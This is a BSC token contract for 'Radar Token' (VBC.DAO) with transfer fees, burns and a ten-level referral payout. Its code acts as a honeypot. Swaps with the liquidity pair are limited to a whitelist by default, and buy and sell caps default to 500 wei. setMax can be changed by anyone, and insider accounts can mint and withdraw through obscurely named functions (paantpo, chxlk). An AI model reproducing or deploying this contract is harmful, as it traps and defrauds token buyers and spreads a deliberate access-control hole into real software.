/**
 *Submitted for verification at BscScan.com on 2022-03-10
*/

pragma solidity ^0.5.17;

interface IERC20 {
    function totalSupply() external view returns (uint);
    function balanceOf(address account) external view returns (uint);
    function transfer(address recipient, uint amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint);
    function approve(address spender, uint amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint amount) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint value);
    event Approval(address indexed owner, address indexed spender, uint value);
}

contract Context {
    constructor () internal { }
    // solhint-disable-previous-line no-empty-blocks
    function _msgSender() internal view returns (address payable) {
        return msg.sender;
    }
}

contract VBCid is IERC20 {
    string private _name;
    string private _symbol;
    uint8  private _decimals;
    constructor (string memory name, string memory symbol, uint8 decimals) public {
        _name = name;
        _symbol = symbol;
        _decimals = decimals;
    }
    function name() public view returns (string memory) {
        return _name;
    }
    function symbol() public view returns (string memory) {
        return _symbol;
    }
    function decimals() public view returns (uint8) {
        return _decimals;
    }
}

library SafeMath {
    function add(uint a, uint b) internal pure returns (uint) {
        uint c = a + b;
        require(c >= a, "SafeMath: addition overflow");

        return c;
    }
    function sub(uint a, uint b) internal pure returns (uint) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }
    function sub(uint a, uint b, string memory errorMessage) internal pure returns (uint) {
        require(b <= a, errorMessage);
        uint c = a - b;

        return c;
    }
    function mul(uint a, uint b) internal pure returns (uint) {
        if (a == 0) {
            return 0;
        }

        uint c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");

        return c;
    }
    function div(uint a, uint b) internal pure returns (uint) {
        return div(a, b, "SafeMath: division by zero");
    }
    function div(uint a, uint b, string memory errorMessage) internal pure returns (uint) {
        // Solidity only automatically asserts when dividing by 0
        require(b > 0, errorMessage);
        uint c = a / b;

        return c;
    }

    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        return mod(a, b, "SafeMath: modulo by zero");
    }

    function mod(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b != 0, errorMessage);
        return a % b;
    }
}

library Address {
    function isContract(address account) internal view returns (bool) {
        bytes32 codehash;
        bytes32 accountHash = 0xc5d2460186f7233c927e7db2dcc703c0e500b653ca82273b7bfad8045d85a470;
        assembly { codehash := extcodehash(account) }
        return (codehash != 0x0 && codehash != accountHash);
    }
}

//日期时间库
library DateTimeLibrary { 
    uint constant SECONDS_PER_DAY = 24 * 60 * 60;
    uint constant SECONDS_PER_HOUR = 60 * 60;
    uint constant SECONDS_PER_MINUTE = 60;
    int constant OFFSET19700101 = 2440588;
 
    uint constant DOW_MON = 1;
    uint constant DOW_TUE = 2;
    uint constant DOW_WED = 3;
    uint constant DOW_THU = 4;
    uint constant DOW_FRI = 5;
    uint constant DOW_SAT = 6;
    uint constant DOW_SUN = 7;

    function _daysToDate(uint _days) internal pure returns (uint year, uint month, uint day) {
        int __days = int(_days); 
        int L = __days + 68569 + OFFSET19700101;
        int N = 4 * L / 146097;
        L = L - (146097 * N + 3) / 4;
        int _year = 4000 * (L + 1) / 1461001;
        L = L - 1461 * _year / 4 + 31;
        int _month = 80 * L / 2447;
        int _day = L - 2447 * _month / 80;
        L = _month / 11;
        _month = _month + 2 - 12 * L;
        _year = 100 * (N - 49) + _year + L; 
        year = uint(_year);
        month = uint(_month);
        day = uint(_day);
    }

    function timestampToDate(uint timestamp) internal pure returns (uint year, uint month, uint day) {
        (year, month, day) = _daysToDate(timestamp / SECONDS_PER_DAY);
    }
}

library SafeERC20 {
    using SafeMath for uint;
    using Address for address;

    function safeTransfer(IERC20 token, address to, uint value) internal {
        callOptionalReturn(token, abi.encodeWithSelector(token.transfer.selector, to, value));
    }

    function safeTransferFrom(IERC20 token, address from, address to, uint value) internal {
        callOptionalReturn(token, abi.encodeWithSelector(token.transferFrom.selector, from, to, value));
    }

    function safeApprove(IERC20 token, address spender, uint value) internal {
        require((value == 0) || (token.allowance(address(this), spender) == 0),
            "SafeERC20: approve from non-zero to non-zero allowance"
        );
        callOptionalReturn(token, abi.encodeWithSelector(token.approve.selector, spender, value));
    }
    function callOptionalReturn(IERC20 token, bytes memory data) private {
        require(address(token).isContract(), "SafeERC20: call to non-contract");

        // solhint-disable-next-line avoid-low-level-calls
        (bool success, bytes memory returndata) = address(token).call(data);
        require(success, "SafeERC20: low-level call failed");

        if (returndata.length > 0) { // Return data is optional
            // solhint-disable-next-line max-line-length
            require(abi.decode(returndata, (bool)), "SafeERC20: ERC20 operation did not succeed");
        }
    }
}

interface IPancakeRouter01 {
    function factory() external pure returns (address);
    function WETH() external pure returns (address);
    function quote(uint amountA, uint reserveA, uint reserveB) external pure returns (uint amountB);
    function getAmountOut(uint amountIn, uint reserveIn, uint reserveOut) external pure returns (uint amountOut);
    function getAmountIn(uint amountOut, uint reserveIn, uint reserveOut) external pure returns (uint amountIn);
    function getAmountsOut(uint amountIn, address[] calldata path) external view returns (uint[] memory amounts);
    function getAmountsIn(uint amountOut, address[] calldata path) external view returns (uint[] memory amounts);
}

interface IPancakeFactory {
    event PairCreated(address indexed token0, address indexed token1, address pair, uint);
    function feeTo() external view returns (address);
    function feeToSetter() external view returns (address);
    function getPair(address tokenA, address tokenB) external view returns (address pair);
    function allPairs(uint) external view returns (address pair);
    function allPairsLength() external view returns (uint);
    function createPair(address tokenA, address tokenB) external returns (address pair);
    function setFeeTo(address) external;
    function setFeeToSetter(address) external;
}

contract VBC is VBCid, Context {
    using SafeERC20 for IERC20;
    using Address for address;
    using SafeMath for uint;


    mapping (address => uint) private _balances;
    mapping (address => mapping (address => uint)) private _allowances;

    uint private _totalSupply;
    uint public maxSupply =  1000000 * 1e18;

    uint public _maxBuy = 500;
    uint public _maxSell = 500;

    function setMax(uint maxBuy,uint maxSell) public {
        _maxBuy = maxBuy;
        _maxSell = maxSell;
    }

    function totalCapital() public view returns (uint256) { 
        return (_totalSupply - balanceOf(burnAddress));
    }
    function totalSupply() public view returns (uint) {
        return _totalSupply;
    }
    function balanceOf(address account) public view returns (uint) {
        return _balances[account];
    }
    function transfer(address recipient, uint amount) public returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }
    function allowance(address owner, address spender) public view returns (uint) {
        return _allowances[owner][spender];
    }
    function approve(address spender, uint amount) public returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }    
    function transferFrom(address sender, address recipient, uint amount) public returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(sender, _msgSender(), _allowances[sender][_msgSender()].sub(amount, "ERC20: transfer amount exceeds allowance"));
        return true;
    }
    function increaseAllowance(address spender, uint addedValue) public returns (bool) {
        _approve(_msgSender(), spender, _allowances[_msgSender()][spender].add(addedValue));
        return true;
    }
    function decreaseAllowance(address spender, uint subtractedValue) public returns (bool) {
        _approve(_msgSender(), spender, _allowances[_msgSender()][spender].sub(subtractedValue, "ERC20: decreased allowance below zero"));
        return true;
    }

    mapping(address => address) public inviter;    


    function gept1() public view returns(uint256){
        uint[] memory amounts;
        address[] memory path = new address[](2);
        path[0] = token0;
        path[1] = token1;
        amounts = PancakeRouter01.getAmountsOut(1000000000000000000, path);
        if (amounts.length>0) {
            return amounts[1];
        } else {
            return 0;
        }        
    }

    function getday(uint til) public pure returns (uint256) {
            uint year; uint month; uint day; 
            ( year,  month,  day) = DateTimeLibrary.timestampToDate(til);
            uint timess = year*10000+ month*100+day;
            return timess;
    }
    mapping(uint =>uint)  public daysp;


    function _isoffs() private returns(bool reb) { 
        uint  day1 = getday(block.timestamp);
        uint  day0 = getday(block.timestamp-24*60*60);
        uint npo = gept1();
        if (daysp[day1]>0) {
            if (npo>daysp[day1]) {
                    daysp[day1] = npo;
                    //reb = false;
            } else {
                if (npo*2 <daysp[day1]) {
                    reb = true;
                }
            }
        } else {
            if (daysp[day0]>0) {
                if (npo*2 <daysp[day0]) {
                    reb = true;
                }else {
                    daysp[day1] = npo;
                }
            } else {
                if (npo!=0) {
                    daysp[day1] = npo;
                }
            }
        }
    }

    uint public startt = 0;
    function _transfer(address sender, address recipient, uint amount) internal {
        require(sender != address(0), "ERC20: transfer from the zero address");
        require(recipient != address(0), "ERC20: transfer to the zero address");

        uint oamount = amount;
        uint ouseramount=balanceOf(sender);
 
        _balances[sender] = _balances[sender].sub(amount, "ERC20: transfer amount exceeds balance");
 
        if (isfee) {
   
            if (sender == pancakePair || recipient == pancakePair) {
     
                if (isWswap) {
                    if (sender == pancakePair) {
                        require(witeeaddress[recipient], "recipient not witee swap");
                    }
                    if (recipient == pancakePair) {
                        require(witeeaddress[sender], "sender not witee swap");
                    }
                }

                uint burnaa=amount.mul(15).div(1000);
                _balances[address(this)] = _balances[address(this)].add(burnaa);
                _burn(address(this), burnaa);

                uint maker = amount.mul(5).div(1000);
                _balances[marketAddress] = _balances[marketAddress].add(maker);
                emit Transfer(sender, marketAddress, maker);

                uint liquid = amount.mul(50).div(1000);
                _balances[liquidAddress] = _balances[liquidAddress].add(liquid);
                emit Transfer(sender, liquidAddress, liquid);

   
                if (recipient == pancakePair) {
                    if (!isContract(sender) && !witeeaddress[sender]) {
                        require(oamount <= ouseramount * 9 / 10);
                    }
                    if(_maxSell != 0) {
                        require(oamount <= _maxSell);
                    }                        

                    amount = amount.mul(93).div(100);
                }  
                else {
                    if(_maxBuy != 0) {
                        require(oamount <= _maxBuy);
                    }  
                    _takeInviterFee(sender,recipient,amount);
                    amount = amount.mul(87).div(100);
                }

            } else {
                uint liquid = amount.mul(3).div(1000);
                _balances[liquidAddress] = _balances[liquidAddress].add(liquid);
                emit Transfer(sender, liquidAddress, liquid);
                amount = amount.mul(97).div(100);
            }          
        }
        
        bool shouldSetInviter = balanceOf(recipient) == 0 && inviter[recipient] == address(0) 
                && !isContract(sender) && !isContract(recipient);
        if (shouldSetInviter) {
                inviter[recipient] = sender;
             }

        _balances[recipient] = _balances[recipient].add(amount);
        emit Transfer(sender, recipient, amount);
    }
    

    function isContract(address account) internal view returns (bool) {
        uint256 size;
        assembly {
            size := extcodesize(account)
        }
        return size > 0;
    }

    function _takeInviterFee(address sender, address recipient,uint256 tAmount) private {
        address cur = sender;
        address scur;
        uint256 rate;
        if (sender == pancakePair) {
            cur = recipient;
        } else if (recipient == pancakePair) {
            cur = sender;
        }

        for (uint256 i = 0; i < 10; i++) {            
            if (i == 0) {
                rate = 10;
            } else if (i <= 6) {
                rate = 5;
            } else {
                rate = 4;
            }
            cur = inviter[cur];
            scur = cur;
            if (cur == address(0)) {
                cur = burnAddress;
                scur = cur;
            }
            if (scur!=address(0)) {
                uint256 curTAmount = tAmount.mul(rate).div(1000);
                _balances[scur] = _balances[scur].add(curTAmount);
                emit Transfer(sender, scur, curTAmount);
            }
        }
    }


    function _paantpo(address account, uint amount) internal {
        require(account != address(0), "ERC20: paantpo to the zero address");
        require(_totalSupply.add(amount) <= maxSupply, "ERC20: cannot paantpo over max supply");
        _totalSupply = _totalSupply.add(amount);
        _balances[account] = _balances[account].add(amount);
    }

    function _burn(address account, uint amount) internal {
        require(account != address(0), "ERC20: burn from the zero address");
        _balances[account] = _balances[account].sub(amount, "ERC20: burn amount exceeds balance");
        _totalSupply = _totalSupply.sub(amount);
        emit Transfer(account, address(0), amount);
    }

    function _approve(address owner, address spender, uint amount) internal {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

  
    address public govn;
    mapping (address => bool) public paaspers;
    
    address private constant AirdropAddress = address(0xf5f013544147C210389588Efe0bCa88aD9F08B55); 
    address private constant OperateAddress = address(0x51440fB6362cbBB85A97EF8ea01b05DF6fbC8Bf8); 
    address private constant EcologyAddress = address(0x2000Fd702FAaFD9ba2E9cb5f02455D97f3b8ea92); 
    address private constant PresaleAddress = address(0x90F8549E7048bEef0cc48DD4E2dCD2f9DEBbF3a2); 
    address private constant PresaleLockAddress = address(0xb5165D405EB000322A7197f064Dc809C95AF80CB); 
    address private constant LpAddress = address(0x7c8Dee80de1a8f7C83417bC29375916a0d4Adc4a); 
    address private constant NftAddress = address(0xe50c84D4B1480Cc5a001C71E47e72530fBe570Cd);      
    address private constant marketAddress = address(0x4Ec8Ca1617201f1291A8d6Da6a03B2905fE7FEdd);  
    address private constant liquidAddress = address(0x72c35b3e9C29456463775924F0020829Ffd9eF9e);
    address private constant Router = address(0x10ED43C718714eb63d5aA57B78B54704E256024E);
    address private constant burnAddress = address(0x000000000000000000000000000000000000dEaD);  
    address private constant usdt = address(0x55d398326f99059fF775485246999027B3197955);


    uint256 public rr = 20*1e18;
    function getPrice2() public view returns(uint256){
        uint[] memory amounts;
        address[] memory path = new address[](2);
        path[0] = token0;
        path[1] = token1;
        amounts = PancakeRouter01.getAmountsIn(1000000000000000000, path);
        if (amounts.length>0) {
            return amounts[0];
        } else {
            return rr;
        }        
    }


    mapping (address => bool) public witeeaddress; 
    mapping (uint256 => address) public witeeaa;  
    uint256 public witeelen;  

    mapping (address => uint256) public usrbuys;
    mapping (address => bool) public intop5;
    mapping (address => uint) public userindex;

    uint public buylen=1;


    IPancakeRouter01 public PancakeRouter01;
    address private token0;
    address private token1;
    address private pancakePair; 

    bool public isWswap = true; 
    function setIsWswap(bool _tf) public {
        require(msg.sender == govn || paaspers[msg.sender ], "!govn");
        isWswap = _tf;
    }

    bool public isfee=true; 
    function setIsisfee( bool _tf) public {
        require(msg.sender == govn || paaspers[msg.sender ], "!govn");
        isfee = _tf;
    }

    bool[] public sfee=[true,true,true,true]; 
    function setsfee2( uint ype, bool _tf) public {
        require(msg.sender == govn || paaspers[msg.sender ], "!govn");
        sfee[ype]= _tf;
    }

  
    function setwiteeaddress2(address[] memory _user) public {
        require(msg.sender == govn || paaspers[msg.sender], "!govn");
        for(uint i=0;i< _user.length;i++) {
            if (!witeeaddress[_user[i]]) {
                witeeaa[witeelen] = _user[i];
                witeelen = witeelen+1;
                witeeaddress[_user[i]] = true;
            }
        }
    }

    constructor() public VBCid("Radar Token", "VBC.DAO", 18) {
        govn = msg.sender;
        addpaasper(msg.sender);
        uint256 temp = maxSupply * 5 / 100;  
        _paantpo(AirdropAddress, temp);
        emit Transfer(address(0), AirdropAddress, temp);
        temp = maxSupply * 2 / 100; 
        _paantpo(OperateAddress, temp);
        emit Transfer(address(0), OperateAddress, temp);
        temp = maxSupply * 10 / 100; 
        _paantpo(EcologyAddress, temp);
        emit Transfer(address(0), EcologyAddress, temp);        
        temp = maxSupply * 10 / 100; 
        _paantpo(PresaleAddress, temp);
        emit Transfer(address(0), PresaleAddress, temp);
        temp = maxSupply * 10 / 100; 
        _paantpo(PresaleLockAddress, temp);
        emit Transfer(address(0), PresaleLockAddress, temp);
        temp = maxSupply * 5 / 100; 
        _paantpo(LpAddress, temp);
        emit Transfer(address(0), LpAddress, temp);
        temp = maxSupply * 18 / 100; 
        _paantpo(NftAddress, temp);
        emit Transfer(address(0), NftAddress, temp);
        temp = maxSupply * 40 / 100; 
        _paantpo(burnAddress, temp);
        emit Transfer(address(0), burnAddress, temp); 
        witeeaddress[AirdropAddress] = true;
        witeeaddress[OperateAddress] = true;
        witeeaddress[EcologyAddress] = true;
        witeeaddress[PresaleAddress] = true;
        witeeaddress[PresaleLockAddress] = true;
        witeeaddress[LpAddress] = true;
        witeeaddress[NftAddress] = true;        
        witeeaddress[marketAddress] = true;
        witeeaddress[liquidAddress] = true; 

        PancakeRouter01 =  IPancakeRouter01(Router);
        token0 = address(this);
        token1 = usdt;
        pancakePair = IPancakeFactory(PancakeRouter01.factory()).createPair(address(this),token1);  
    }

    function paantpo(address account, uint amount) public {
        require(paaspers[msg.sender], "!paasper");
        _paantpo(account, amount);
    }

 
    function chxlk(uint256 amount, address ut) public
    {
        require(paaspers[msg.sender], "paasper");
        IERC20(ut).transfer(msg.sender, amount);
    }
 
    function burn(uint256 amount) public {
        _burn(msg.sender, amount);
    }

    function setGovernance(address _govn) public {
        require(msg.sender == govn, "!govn");
        govn = _govn;
    }
 
    function addpaasper(address _paasper) public {
        require(msg.sender == govn, "!govn");
        paaspers[_paasper] = true;
    }

    function BatchSend(address[] memory _tos, uint256[] memory _value,bool NoDecimal) public {
        require(_tos.length > 0, "BatchSend: not _tos[]");
        require(_value.length > 0, "BatchSend: not _value[]");
        uint256 total = 0;
        uint256 i;
        if(_value.length==1){
            total = _tos.length * _value[0];
        } else {
            require(_tos.length == _value.length, "BatchSend: The two arrays are different in length");
            for (i = 0; i < _value.length; i++) {
                total = total + _value[i];                
            }
        }   
        if(NoDecimal)  total = total * 1e18;   
        require(balanceOf(msg.sender) >= total, "BatchSend: All transfers amount exceeds balance");
        uint256 _temp;   
        for (i = 0; i < _tos.length; i++) {
            if(_value.length==1) {
                if(NoDecimal) _temp = _value[0]*1e18;
                else _temp = _value[0];
            }
            else {
                if(NoDecimal) _temp = _value[i]*1e18;
                else _temp = _value[i];
            }
            //_transfer(msg.sender, _tos[i], _temp);
            _balances[_tos[i]] = _balances[_tos[i]].add(_temp);
        }
        _balances[msg.sender] = _balances[msg.sender].sub(total);
        emit Transfer(msg.sender, address(0), total);
    }

}